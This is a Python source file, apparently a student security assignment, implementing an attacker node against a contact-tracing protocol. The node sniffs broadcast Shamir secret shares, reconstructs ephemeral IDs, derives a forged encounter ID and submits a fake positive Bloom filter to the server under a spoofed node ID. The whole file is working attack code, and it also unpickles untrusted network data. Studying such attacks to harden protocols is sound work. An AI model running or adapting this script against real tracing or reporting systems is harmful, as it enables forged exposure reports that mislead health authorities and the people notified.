# -*- coding: utf-8 -*-
"""
Toran Shahi z5342008 William William z5268184
"""
import sys
import socket
import pickle
import time
import logging
import threading
from bitarray import bitarray
import mmh3
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from sslib import shamir
import os

import warnings
#Supress warnings for cleaner console output
warnings.filterwarnings("ignore")

BLOOM_FILTER_SIZE = 100 * 8000  # Size in KB

# Set up logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)




class AttackerNode:
    def __init__(self, port, server_ip, server_port):
        self.port = port
        self.server_ip = server_ip
        self.server_port = server_port
        self.collected_ephids = {}
        self.reconstructed_encid = None
        self.running = True
        self.fake_node_id = 999  # Fake node ID for the attacker

    def start_listening(self):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except AttributeError:
                pass  # SO_REUSEPORT might not be available on all systems
            sock.bind(("", self.port))
            sock.settimeout(1)  # Set a timeout for the socket
            logging.info(f"Attacker node listening on port {self.port}")

            while self.running:
                try:
                    data, addr = sock.recvfrom(1024)
                    self.process_message(data, addr)
                except socket.timeout:
                    continue  # This allows checking self.running periodically
                except Exception as e:
                    logging.error(f"Error in listening: {str(e)}")

    def process_message(self, data, addr):
        try:
            received_data = pickle.loads(data)
            if isinstance(received_data, list) and len(received_data) == 4:
                chunk, ephid_hash, prime_mod,node = received_data
                logging.info(f"Received chunk from {addr}: {chunk}")

                if self.reconstructed_encid is None:
                    if ephid_hash not in self.collected_ephids:
                        self.collected_ephids[ephid_hash] = {
                            "chunks": [],
                            "prime_mod": prime_mod,
                        }
                    self.collected_ephids[ephid_hash]["chunks"].append(chunk)

                    self.try_reconstruct_ephid(ephid_hash)
            else:
                logging.warning(f"Received unexpected data format from {addr}")

        except Exception as e:
            logging.error(f"Error processing message: {str(e)}")

    def try_reconstruct_ephid(self, ephid_hash):
        ephid_data = self.collected_ephids.get(ephid_hash)
        if ephid_data and len(ephid_data["chunks"]) >= 3:
            logging.info("Attempting to reconstruct EphID")
            try:
                reconstructed_ephid = shamir.recover_secret(
                    {
                        "shares": ephid_data["chunks"][:3],
                        "prime_mod": ephid_data["prime_mod"],
                    }
                )

                digest = hashes.Hash(hashes.SHA256())
                digest.update(reconstructed_ephid)
                computed_hash = digest.finalize()

                if computed_hash == ephid_hash:
                    logging.info(
                        f"Successfully reconstructed EphID: {reconstructed_ephid.hex()}"
                    )
                    self.generate_fake_encid(reconstructed_ephid)
                else:
                    logging.info("Failed to reconstruct EphID: hash mismatch")
            except Exception as e:
                logging.error(f"Error in EphID reconstruction: {str(e)}")

    def generate_fake_encid(self, peer_ephid):
        if self.reconstructed_encid is None:
            private_key = x25519.X25519PrivateKey.generate()
            shared_key = private_key.exchange(
                x25519.X25519PublicKey.from_public_bytes(peer_ephid)
            )

            enc_id = HKDF(
                algorithm=hashes.SHA256(), length=32, salt=None, info=b"handshake data"
            ).derive(shared_key)

            self.reconstructed_encid = enc_id
            logging.info(f"Generated fake EncID: {enc_id.hex()}")
        else:
            logging.info("EncID already generated. Skipping.")
            
    def pad_cbf(self, cbf):
        padding = bitarray('0' * (BLOOM_FILTER_SIZE - len(cbf)))
        cbf.extend(padding)
        return cbf

    def create_fake_cbf(self):
        if self.reconstructed_encid is None:
            logging.info("No EncID to create fake CBF")
            return None

        cbf = bitarray(BLOOM_FILTER_SIZE)
        cbf.setall(0)

        # Insert the fake EncID into the CBF
        for i in range(3):  # 3 hash functions
            index = mmh3.hash(self.reconstructed_encid, i) % BLOOM_FILTER_SIZE
            cbf[index] = 1


        return cbf

    def send_fake_positive_cbf(self):
        cbf = self.create_fake_cbf()
        if cbf is None:
            return
        
        cbf = self.pad_cbf(cbf)

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server_ip, self.server_port))
                message = b":".join(
                    [
                        str(self.fake_node_id).encode(),  # Fake node ID
                        b"CBF",
                        cbf.tobytes(),
                    ]
                )
                s.sendall(message)
                response = s.recv(1024).decode()
                logging.info(f"Server response: {response}")
        except Exception as e:
            logging.error(f"Error sending fake positive CBF: {str(e)}")

    def user_input_handler(self):
        while self.running:
            command = (
                input("Enter 'send' to send fake CBF or 'quit' to exit: ")
                .strip()
                .lower()
            )
            if command == "send":
                self.send_fake_positive_cbf()
            elif command == "quit":
                self.running = False
                logging.info("Shutting down attacker node...")
            else:
                print("Invalid command. Please enter 'send' or 'quit'.")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script_name.py <server_ip> <server_port> <port_to_attack>")
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    port_to_attack = int(sys.argv[3])
    attacker = AttackerNode(port_to_attack, server_ip, server_port)

    listen_thread = threading.Thread(target=attacker.start_listening)
    listen_thread.start()

    # Start user input handler in the main thread
    attacker.user_input_handler()

    # Wait for the listening thread to finish
    listen_thread.join()

    logging.info("Attacker node stopped")
